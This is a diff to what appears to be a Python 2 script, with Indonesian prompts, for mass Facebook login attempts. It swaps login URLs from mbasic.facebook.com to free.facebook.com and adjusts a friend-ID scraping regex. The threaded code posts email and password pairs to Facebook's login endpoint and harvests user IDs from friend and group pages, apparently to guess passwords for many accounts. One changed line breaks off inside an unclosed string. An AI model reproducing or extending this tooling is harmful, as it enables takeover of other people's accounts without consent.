@@ -35,7 +35,7 @@ class mt(threading.Thread):
 		return self.a,self.id
 	def run(self):
 		try:
-			data = urllib2.urlopen(urllib2.Request(url='https://mbasic.facebook.com/login.php?login_attempt=1',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9.0.0; Pixel XL Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.0 Mobile Safari/537.36)]
+			data = urllib2.urlopen(urllib2.Request(url='https://free.facebook.com/login.php?login_attempt=1',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9.0.0; Pixel XL Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.0 Mobile Safari/537.36)]
 
 		except KeyboardInterrupt:
 			sys.exit()
@@ -234,7 +234,7 @@ def login():
 	us = inputD('[?] Email/HP')
 	pa = inputD('[?] Kata Sandi')
 	cetak('!h[*] Sedang Login....')
-	buka('https://mbasic.facebook.com')
+	buka('https://free.facebook.com')
 	br.select_form(nr=0)
 	br.form['email']=us
 	br.form['pass']=pa
@@ -273,7 +273,7 @@ def idgroup():
 	else:
 		return menu()
 def saring_id_teman(r):
-	for i in re.findall(r'/friends/hovercard/free/\?uid=(.*?)&',r):
+	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
 		id_bteman.append(i)
 def idteman():
 	if log != 1:
